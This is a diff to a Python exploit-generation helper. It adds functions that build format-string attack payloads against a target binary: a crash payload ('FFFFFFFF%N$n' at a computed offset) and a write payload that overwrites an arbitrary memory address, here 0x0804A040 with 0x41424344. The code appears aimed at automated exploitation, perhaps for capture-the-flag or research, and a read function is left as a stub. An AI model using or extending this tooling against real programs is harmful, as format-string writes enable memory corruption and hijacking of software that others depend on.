@@ -102,7 +102,7 @@ def get_offset(binary):
     return offset
 
 
-# not useful now
+# not yet useful now
 def read_addr(binary, addr):
 
     import functions
@@ -201,17 +201,43 @@ def write_addr_content(binary, addr, content):
     #wp[addr] = struct.pack('@I', 0x41424344)
     wp[addr] = struct.pack('@I', content)
     fmtpayload = wp.generate(settings)
-    print ("payload", repr(fmtpayload))
     return fmtpayload
+
+
+def verify_exploit(binary):
+    return get_offset(binary)
+
+def get_crash_payload(binary):
+    offset = get_offset(binary)
+    if offset:
+        payload = "FFFFFFFF%{}$n".format(offset)
+        print ("crash payload:", payload)
+        return payload
+    return None
+
+def get_write_payload(binary, addr, content):
+
+    payload =  write_addr_content(binary, addr, content)
+    print ("write payload", repr(payload))
+    return payload
+
+
+def get_read_payload(addr):
+    pass
+
 
 
 def test():
 
-    binary = sys.argv[1]
+    binary = os.path.join(os.path.abspath('.'), os.path.basename(sys.argv[1]))
     #read_addr(binary, 0x0804A040)
-    write_addr_content(binary, 0x0804A040, 0x41424344)
+    addr = 0x0804A040
+    content = 0x41424344
+    verify_exploit(binary) and get_write_payload(binary, addr, content) and get_read_payload(addr)
+
 
 if __name__ == '__main__':
     test()
+
 
 
